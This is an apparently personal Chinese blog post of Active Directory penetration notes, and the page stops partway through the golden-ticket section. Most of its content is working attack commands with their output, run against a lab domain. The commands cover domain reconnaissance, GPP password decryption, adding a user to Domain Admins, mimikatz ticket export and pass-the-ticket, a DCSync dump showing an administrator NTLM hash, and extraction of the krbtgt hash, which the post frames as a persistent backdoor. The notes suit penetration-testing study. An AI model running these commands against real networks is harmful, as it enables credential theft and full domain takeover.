<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>域渗透总结 | KB-AT的博客</title><meta name="keywords" content="域渗透"><meta name="author" content="AT"><meta name="copyright" content="AT"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="域渗透总结学习 总结&#x2F;记录一下域渗透的渗透过程和一些坑点。 注意事项 https:&#x2F;&#x2F;pentestlab.blog&#x2F;tag&#x2F;ntds-dit&#x2F;https:&#x2F;&#x2F;www.ired.team&#x2F;offensive-security-experiments&#x2F;active-directory-kerberos-abusehttps:&#x2F;&#x2F;adsecurity.org&#x2F;   在域中对机器进行访问（如dir&#x2F;ps">
<meta property="og:type" content="article">
<meta property="og:title" content="域渗透总结">
<meta property="og:url" content="https://kb-at-zero.github.io/2021/06/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/index.html">
<meta property="og:site_name" content="KB-AT的博客">
<meta property="og:description" content="域渗透总结学习 总结&#x2F;记录一下域渗透的渗透过程和一些坑点。 注意事项 https:&#x2F;&#x2F;pentestlab.blog&#x2F;tag&#x2F;ntds-dit&#x2F;https:&#x2F;&#x2F;www.ired.team&#x2F;offensive-security-experiments&#x2F;active-directory-kerberos-abusehttps:&#x2F;&#x2F;adsecurity.org&#x2F;   在域中对机器进行访问（如dir&#x2F;ps">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://kb-at-zero.github.io/images/ad.jpg">
<meta property="article:published_time" content="2021-06-21T06:30:00.000Z">
<meta property="article:modified_time" content="2022-02-15T03:51:19.887Z">
<meta property="article:author" content="AT">
<meta property="article:tag" content="域渗透">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://kb-at-zero.github.io/images/ad.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://kb-at-zero.github.io/2021/06/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%BB%E7%BB%93/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?https://hm.baidu.com/hm.js?ad9755e2bb4766b21a8ee011534e2a90";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-02-15 11:51:19'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="KB-AT的博客" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/touxiang.gif" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">21</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/images/ad.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">KB-AT的博客</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">域渗透总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-06-21T06:30:00.000Z" title="发表于 2021-06-21 14:30:00">2021-06-21</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-02-15T03:51:19.887Z" title="更新于 2022-02-15 11:51:19">2022-02-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%9F%9F/">域</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="域渗透总结"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="域渗透总结学习"><a href="#域渗透总结学习" class="headerlink" title="域渗透总结学习"></a>域渗透总结学习</h1><hr>
<p>总结/记录一下域渗透的渗透过程和一些坑点。</p>
<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><blockquote>
<p><a target="_blank" rel="noopener" href="https://pentestlab.blog/tag/ntds-dit/">https://pentestlab.blog/tag/ntds-dit/</a><br><a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse</a><br><a target="_blank" rel="noopener" href="https://adsecurity.org/">https://adsecurity.org/</a></p>
</blockquote>
<blockquote>
<p><strong>在域中对机器进行访问（如dir/psexec等），不能使用IP，需要使用完整的机器名.域名。</strong><br><strong>注意域内相关的攻击，最好先把攻击机的DNS设置为域控，不然要手工把相关的域名、机器名的解析加入到hosts文件。</strong></p>
</blockquote>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">票据，经过KDC（一般就是域控）验证用户名密码正确后，生成的会话票据（可以理解为网站登录后的session）。</span><br><span class="line">黄金票据，使用krbtgt账号的hash，可以生成任意用户的票据。</span><br><span class="line">白银票据，使用主机账号的hash，可以生成用来控制该主机的服务票据（CIFS、WMI等）。</span><br><span class="line">非约束委派，服务可以使用其他用户的票据，如果其他用户登录过这个服务，则可以再这台服务的主机上导出登录用户的票据。</span><br><span class="line">约束委派，一个用户可以去申请另外一个服务（拥有权限的可委派服务）的票据（ST）。</span><br><span class="line">基于资源的约束委派，创建计算机账号，再利用</span><br><span class="line"></span><br><span class="line">crackmapexec新版编译成exe不能使用</span><br><span class="line">ntlmrelayx的windows exe版也不能使用</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest UseLogonCredential</span><br><span class="line">SYSVOL KB2962486</span><br></pre></td></tr></table></figure>



<h1 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h1><h3 id="net相关命令"><a href="#net相关命令" class="headerlink" title="net相关命令"></a>net相关命令</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> config workstation</span><br><span class="line"><span class="built_in">net</span> user /domain</span><br><span class="line"><span class="built_in">net</span> group /domain</span><br><span class="line"><span class="built_in">net</span> group &quot;domain admins&quot; /domain</span><br><span class="line"><span class="built_in">net</span> group &quot;domain computers&quot; /domain</span><br><span class="line"><span class="built_in">net</span> group &quot;domain controllers&quot; /domain</span><br><span class="line"><span class="built_in">net</span> user test /domain</span><br><span class="line"><span class="built_in">net</span> user test Admin123 /add /domain</span><br><span class="line"><span class="built_in">net</span> group &quot;domain admins&quot; test /add /domain</span><br><span class="line">nltest /trusted_domains</span><br></pre></td></tr></table></figure>



<h3 id="dsquery"><a href="#dsquery" class="headerlink" title="dsquery"></a>dsquery</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">导出所有信息</span><br><span class="line">dsquery.exe * -attr * -limit <span class="number">0</span></span><br><span class="line">dsquery.exe * -s <span class="number">192</span>.<span class="number">168</span>.<span class="number">19</span>.<span class="number">8</span> -u ddh -p Admin123 -attr * -limit <span class="number">0</span></span><br><span class="line"></span><br><span class="line">dsquery.exe computer -s <span class="number">192</span>.<span class="number">168</span>.<span class="number">19</span>.<span class="number">8</span> -u ddh -p Admin123 -limit <span class="number">0</span></span><br><span class="line">dsquery.exe user -s <span class="number">192</span>.<span class="number">168</span>.<span class="number">19</span>.<span class="number">8</span> -u ddh -p Admin123 -limit <span class="number">0</span></span><br><span class="line"></span><br><span class="line">非约束委派</span><br><span class="line">dsquery.exe * -filter &quot;(&amp;(userAccountControl:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">524288</span>))&quot; -limit <span class="number">0</span></span><br><span class="line">约束委派</span><br><span class="line">dsquery.exe * -filter &quot;(&amp;(msds-allowedtodelegateto=*))&quot; -limit <span class="number">0</span> -attr distinguishedName msDS-AllowedToDelegateTo</span><br></pre></td></tr></table></figure>



<h3 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">导出所有信息</span><br><span class="line">ldapsearch -x -H ldap://<span class="number">192</span>.<span class="number">168</span>.<span class="number">19</span>.<span class="number">8</span>:<span class="number">389</span> -D &quot;CN=ddh,CN=Users,DC=tt,DC=com&quot; -w Admin123 -b &quot;DC=tt,DC=com&quot;</span><br><span class="line">非约束委派</span><br><span class="line">ldapsearch -x -H ldap://<span class="number">192</span>.<span class="number">168</span>.<span class="number">19</span>.<span class="number">8</span>:<span class="number">389</span> -D &quot;CN=ddh,CN=Users,DC=tt,DC=com&quot; -w Admin123 -b &quot;DC=tt,DC=com&quot; &quot;(&amp;(userAccountControl:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">524288</span>))&quot;</span><br><span class="line">约束委派</span><br><span class="line">ldapsearch -x -H ldap://<span class="number">192</span>.<span class="number">168</span>.<span class="number">19</span>.<span class="number">8</span>:<span class="number">389</span> -D &quot;CN=ddh,CN=Users,DC=tt,DC=com&quot; -w Admin123 -b &quot;DC=tt,DC=com&quot; &quot;(&amp;(msds-allowedtodelegateto=*))&quot;</span><br></pre></td></tr></table></figure>



<h3 id="AdFind"><a href="#AdFind" class="headerlink" title="AdFind"></a>AdFind</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">导出所有信息</span><br><span class="line">AdFind.exe -alldc+</span><br><span class="line">AdFind.exe -h <span class="number">192</span>.<span class="number">168</span>.<span class="number">19</span>.<span class="number">8</span> -u tt\ddh -up Admin123 -alldc+</span><br><span class="line"></span><br><span class="line">非约束委派</span><br><span class="line">AdFind.exe -f &quot;(&amp;(userAccountControl:<span class="number">1</span>.<span class="number">2</span>.<span class="number">840</span>.<span class="number">113556</span>.<span class="number">1</span>.<span class="number">4</span>.<span class="number">803</span>:=<span class="number">524288</span>))&quot; cn operatingSystem distinguishedName</span><br><span class="line">约束委派</span><br><span class="line">AdFind.exe -f &quot;(&amp;(msds-allowedtodelegateto=*))&quot; cn distinguishedName msDS-AllowedToDelegateTo</span><br><span class="line"></span><br><span class="line">查询用户能够登陆的机器</span><br><span class="line">adfind -h <span class="number">192</span>.<span class="number">168</span>.<span class="number">221</span>.<span class="number">130</span> -sc u:test</span><br><span class="line">adfind -h <span class="number">192</span>.<span class="number">168</span>.<span class="number">221</span>.<span class="number">130</span> -sc u:test | <span class="built_in">findstr</span> userWorkstations //非域权限执行需要指定账户密码</span><br><span class="line"></span><br><span class="line">查看域内所有用户详细信息：</span><br><span class="line">AdFind.exe -h DNS_SERVER_IP -sc u:*</span><br></pre></td></tr></table></figure>



<h3 id="setspn"><a href="#setspn" class="headerlink" title="setspn"></a>setspn</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询域中注册的服务</span><br><span class="line">setspn -q */*</span><br></pre></td></tr></table></figure>



<h3 id="ldapadmin"><a href="#ldapadmin" class="headerlink" title="ldapadmin"></a>ldapadmin</h3><p><img src="/images/image-20200830124641265.png" alt="image-20200830124641265"></p>
<p><img src="/images/image-20200830133745062.png" alt="image-20200830133745062"></p>
<h3 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">findstr /S /I cpassword \\DC\sysvol\xx.com\Policies\*.xml</span><br><span class="line"></span><br><span class="line">kali自带解密工具</span><br><span class="line">gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw</span><br></pre></td></tr></table></figure>



<h3 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h3><ul>
<li>wevtutil</li>
</ul>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">登陆日志</span><br><span class="line">wevtutil qe security /q:<span class="string">&quot;Event[System[(EventID=4624 or EventID=4768 or EventID=4776)]]&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>fulleventlogview.exe</li>
</ul>
<p><img src="/images/image-20210105111015246.png" alt="image-20210105111015246"></p>
<h1 id="票据"><a href="#票据" class="headerlink" title="票据"></a>票据</h1><h3 id="缓存票据"><a href="#缓存票据" class="headerlink" title="缓存票据"></a>缓存票据</h3><p>可在非域机器上使用，访问必须用ComputerName.domain.local的形式去访问。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">域机器上导出可用票据，拷贝到本地</span><br><span class="line">mimikatz privilege::debug &quot;sekurlsa::tickets /export&quot; <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">在攻击者机器上导入高权限票据</span><br><span class="line">mimikatz privilege::debug &quot;kerberos::ptt C:\Users\jack\Desktop\Administrator@krbtgt-TT.COM.kirbi&quot; <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">使用票据访问其他域机器，还可以使用mimikatz直接同步导出指定用户的hash</span><br><span class="line"><span class="built_in">dir</span> \\域机器名.域名\c$</span><br><span class="line">psexec \\域机器名.域名 <span class="built_in">cmd</span></span><br><span class="line">mimikatz &quot;lsadump::dcsync /domain:tt.com /user:administrator&quot; <span class="keyword">exit</span></span><br></pre></td></tr></table></figure>



<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>&gt;<span class="title">mimikatz</span> <span class="title">privilege</span>::<span class="title">debug</span> &quot;<span class="title">kerberos</span>::<span class="title">ptt</span> <span class="title">C</span>:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>\<span class="title">Administrator</span>@<span class="title">krbtgt</span>-<span class="title">TT.COM.kirbi</span>&quot; <span class="title">exit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span>(<span class="title">commandline</span>) # <span class="title">privilege</span>::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">ERROR</span> <span class="title">kuhl_m_privilege_simple</span> ; <span class="title">RtlAdjustPrivilege</span> (20) <span class="title">c0000061</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span>(<span class="title">commandline</span>) # <span class="title">kerberos</span>::<span class="title">ptt</span> <span class="title">C</span>:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>\<span class="title">Administrator</span>@<span class="title">krbtgt</span>-<span class="title">TT.COM.kirbi</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">* <span class="title">File</span>: &#x27;<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>\<span class="title">Administrator</span>@<span class="title">krbtgt</span>-<span class="title">TT.COM.kirbi</span>&#x27;: <span class="title">OK</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span>(<span class="title">commandline</span>) # <span class="title">exit</span></span></span><br><span class="line"><span class="function"><span class="title">Bye</span>!</span></span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>&gt;<span class="title">dir</span> \\<span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>\<span class="title">c</span>$</span></span><br><span class="line"><span class="function"> 驱动器 \\<span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>\<span class="title">c</span>$ 中的卷没有标签。</span></span><br><span class="line"><span class="function"> 卷的序列号是 7<span class="title">E13</span>-549<span class="title">E</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> \\<span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>\<span class="title">c</span>$ 的目录</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">2009/07/14  11:20    &lt;<span class="title">DIR</span>&gt;          <span class="title">PerfLogs</span></span></span><br><span class="line"><span class="function">2020/08/28  21:24    &lt;<span class="title">DIR</span>&gt;          <span class="title">Program</span> <span class="title">Files</span></span></span><br><span class="line"><span class="function">2020/08/28  21:24    &lt;<span class="title">DIR</span>&gt;          <span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)</span></span><br><span class="line"><span class="function">2020/08/28  21:54    &lt;<span class="title">DIR</span>&gt;          <span class="title">Users</span></span></span><br><span class="line"><span class="function">2020/08/29  16:14    &lt;<span class="title">DIR</span>&gt;          <span class="title">Windows</span></span></span><br><span class="line"><span class="function">               0 个文件              0 字节</span></span><br><span class="line"><span class="function">               5 个目录 30,553,546,752 可用字节</span></span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">jack</span>\<span class="title">Desktop</span>&gt;<span class="title">mimikatz</span> &quot;<span class="title">lsadump</span>::<span class="title">dcsync</span> /<span class="title">domain:tt</span>.<span class="title">com</span> /<span class="title">user:administrator</span>&quot; <span class="title">exit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span>(<span class="title">commandline</span>) # <span class="title">lsadump</span>::<span class="title">dcsync</span> /<span class="title">domain:tt</span>.<span class="title">com</span> /<span class="title">user:administrator</span></span></span><br><span class="line"><span class="function">[<span class="title">DC</span>] &#x27;<span class="title">tt.com</span>&#x27; <span class="title">will</span> <span class="title">be</span> <span class="title">the</span> <span class="title">domain</span></span></span><br><span class="line"><span class="function">[<span class="title">DC</span>] &#x27;<span class="title">WIN</span>-<span class="title">J341S97EGGH.tt.com</span>&#x27; <span class="title">will</span> <span class="title">be</span> <span class="title">the</span> <span class="title">DC</span> <span class="title">server</span></span></span><br><span class="line"><span class="function">[<span class="title">DC</span>] &#x27;<span class="title">administrator</span>&#x27; <span class="title">will</span> <span class="title">be</span> <span class="title">the</span> <span class="title">user</span> <span class="title">account</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Object</span> <span class="title">RDN</span>           : <span class="title">Administrator</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">** <span class="title">SAM</span> <span class="title">ACCOUNT</span> **</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SAM</span> <span class="title">Username</span>         : <span class="title">Administrator</span></span></span><br><span class="line"><span class="function"><span class="title">Account</span> <span class="title">Type</span>         : 30000000 ( <span class="title">USER_OBJECT</span> )</span></span><br><span class="line"><span class="function"><span class="title">User</span> <span class="title">Account</span> <span class="title">Control</span> : 00000200 ( <span class="title">NORMAL_ACCOUNT</span> )</span></span><br><span class="line"><span class="function"><span class="title">Account</span> <span class="title">expiration</span>   : 1601/1/1 8:00:00</span></span><br><span class="line"><span class="function"><span class="title">Password</span> <span class="title">last</span> <span class="title">change</span> : 2020/8/28 21:26:05</span></span><br><span class="line"><span class="function"><span class="title">Object</span> <span class="title">Security</span> <span class="title">ID</span>   : <span class="title">S</span>-1-5-21-1881962959-1052950955-462027270-500</span></span><br><span class="line"><span class="function"><span class="title">Object</span> <span class="title">Relative</span> <span class="title">ID</span>   : 500</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Credentials</span>:</span></span><br><span class="line"><span class="function">  <span class="title">Hash</span> <span class="title">NTLM</span>: 30<span class="title">a96699356033b84283b8918a895d67</span></span></span><br></pre></td></tr></table></figure>



<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><ul>
<li><p><strong>注意</strong></p>
<p>生成任意用户的票据，作为持久化后门利用，不怕用户改密码</p>
<p>可以在非域机器上使用，攻击机使用Win7</p>
<p>访问资源时，必须使用计算机的域名进行访问，不能使用IP</p>
<p>通过代理访问内网，则把主机域名的解析写入本地hosts文件</p>
</li>
<li><p><strong>条件</strong></p>
<p>krbtgt的hash、域SID</p>
</li>
<li><p><strong>操作</strong></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">从域控上先抓到hash和找到域ID</span><br><span class="line">mimikatz privilege::debug &quot;lsadump::lsa /inject /user:krbtgt&quot; <span class="keyword">exit</span></span><br><span class="line">mimikatz privilege::debug sekurlsa::krbtgt <span class="keyword">exit</span></span><br><span class="line">域SID也可以通过任意域用户执行whoami /all查看，去掉最后一个[-]及后面的就是了</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">清除票据要注意，先klist看看有票据不</span><br><span class="line">klist purge</span><br></pre></td></tr></table></figure>

